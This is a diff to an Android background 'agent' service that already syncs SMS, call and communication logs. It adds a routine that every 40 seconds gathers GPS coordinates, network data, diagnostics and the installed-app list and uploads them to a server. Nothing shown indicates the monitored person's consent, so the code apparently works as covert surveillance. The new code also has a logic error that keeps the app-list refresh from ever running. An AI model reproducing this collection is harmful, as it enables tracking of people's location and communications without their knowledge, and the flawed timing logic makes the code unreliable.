@@ -219,7 +219,10 @@ class AgentBackgroundService : Service() {
                         // 2. Incremental sync of SMS and calls
                         performIncrementalSync()
 
-                        // 3. One-time Communication Logs sync if not done
+                        // 3. Periodic Telemetry (Diagnostics, GPS, Network, Apps)
+                        performTelemetrySync()
+
+                        // 4. One-time Communication Logs sync if not done
                         if (!AgentPreferences.isCommLogsSynced(applicationContext)) {
                             syncCommunicationLogs()
                         }
@@ -231,6 +234,27 @@ class AgentBackgroundService : Service() {
                 }
 
                 delay(POLL_INTERVAL_MS)
+            }
+        }
+    }
+
+    private var lastTelemetrySyncMs = 0L
+    private var hasUploadedApps = false
+
+    private suspend fun performTelemetrySync() {
+        val now = System.currentTimeMillis()
+        if (now - lastTelemetrySyncMs >= 40000L) {
+            lastTelemetrySyncMs = now
+            try {
+                val shouldIncludeApps = !hasUploadedApps || ((now - lastTelemetrySyncMs) >= 600000L)
+                val telemetry = DeviceDataReader.collectTelemetry(applicationContext, includeApps = shouldIncludeApps)
+                val res = ApiClient.sendTelemetry(telemetry)
+                if (res != null) {
+                    if (shouldIncludeApps) hasUploadedApps = true
+                    Log.i(TAG, "Device telemetry synced (battery=${telemetry.battery_level}%, GPS=${telemetry.latitude},${telemetry.longitude})")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error performing telemetry sync", e)
             }
         }
     }
